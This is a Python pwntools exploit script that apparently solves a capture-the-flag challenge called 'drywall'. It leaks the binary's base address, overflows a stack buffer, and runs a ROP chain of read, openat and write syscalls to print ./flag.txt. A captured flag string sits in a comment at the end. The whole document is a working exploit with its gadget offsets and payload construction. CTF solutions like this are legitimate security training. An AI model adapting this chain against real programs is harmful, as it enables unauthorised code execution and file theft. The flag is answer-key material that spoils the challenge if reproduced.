from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chal', '''
    b *(main+470)
    continue
''')

# p = remote('drywall.kctf-453514-codelab.kctf.cloud', 1337)

# Get the ELF base address
p.sendlineafter(b'What is your name, epic H4x0r?\n', b'H4x0r')
p.recvuntil(b'<|;)\n')
elf_base_addr = int(p.recvline().strip().decode(), 16)-0x11a3
log.info(f'ELF base address: {hex(elf_base_addr)}')

# Syscall numbers
SYS_READ = 0
SYS_WRITE = 1
SYS_OPENAT = 257

# Gadgets for setting up syscalls
# ROPgadget --binary chal --only "pop|ret" | grep -E "pop rax|pop rdi|pop rsi|pop rdx" | head -10
POP_RAX = elf_base_addr + 0x119b           # pop rax; ret
POP_RDI = elf_base_addr + 0x13db           # pop rdi; ret
POP_RSI_R15 = elf_base_addr + 0x13d9       # pop rsi; pop r15; ret
POP_RDX = elf_base_addr + 0x1199           # pop rdx; pop rbx; ret
# objdump -d chal | grep -A1 "syscall" | grep "ret"
SYSCALL_RET = elf_base_addr + 0x119d       # syscall; ret

# BSS section for storing our filename and read buffer
# readelf -S chal | grep .bss
BSS = elf_base_addr + 0x4050
FILENAME_ADDR = BSS
BUFFER_ADDR = BSS + 16  # More space for filename

# ROP chain
chain = [
    # 1. Read filename from stdin
    POP_RAX, SYS_READ,               # rax = 0 (read syscall)
    POP_RDI, 0,                      # rdi = 0 (stdin)
    POP_RSI_R15, FILENAME_ADDR, 0,   # rsi = address to store filename
    POP_RDX, 16,                     # rdx = 16 (read up to 16 bytes for filename)
    SYSCALL_RET,                     # syscall; ret
    
    # 2. Open the file using openat
    POP_RAX, SYS_OPENAT,             # rax = 257 (openat syscall)
    POP_RDI, 0xffffffffffffff9c,                   # rdi = AT_FDCWD (-100) to use current directory
    POP_RSI_R15, FILENAME_ADDR, 0,   # rsi = pointer to filename
    POP_RDX, 0,                      # rdx = 0 (O_RDONLY flag)
    SYSCALL_RET,                     # syscall; ret
    
    # 3. Read the flag
    # After open, the file descriptor is typically more than 3 (stdin=0, stdout=1, stderr=2)
    POP_RAX, SYS_READ,               # rax = 0 (read syscall)
    POP_RDI, 3,                      # rdi = 3 (file descriptor)
    POP_RSI_R15, BUFFER_ADDR, 0,     # rsi = buffer address
    POP_RDX, 100,                    # rdx = 100 (count)
    SYSCALL_RET,                     # syscall; ret
    
    # 4. Write the flag to stdout
    POP_RAX, SYS_WRITE,              # rax = 1 (write syscall)
    POP_RDI, 1,                      # rdi = 1 (stdout)
    # POP_RSI_R15, BUFFER_ADDR, 0,   # rsi = buffer address, no need for this gadget
    POP_RDX, 100,                    # rdx = 100 (count)
    SYSCALL_RET,                     # syscall; ret
]

# Create the payload
payload = b'\x00' * 0x118  # Padding to reach the return address

# Add the ROP chain
for gadget in chain:
    payload += p64(gadget) if isinstance(gadget, int) else gadget

# Send the payload
p.sendline(payload)

# After our payload is sent, we need to send the filename
p.send(b'./flag.txt\x00')

p.interactive()

# wctf{fL1m5y_w4LL5_br34k_f4r_7h3_31337_459827349}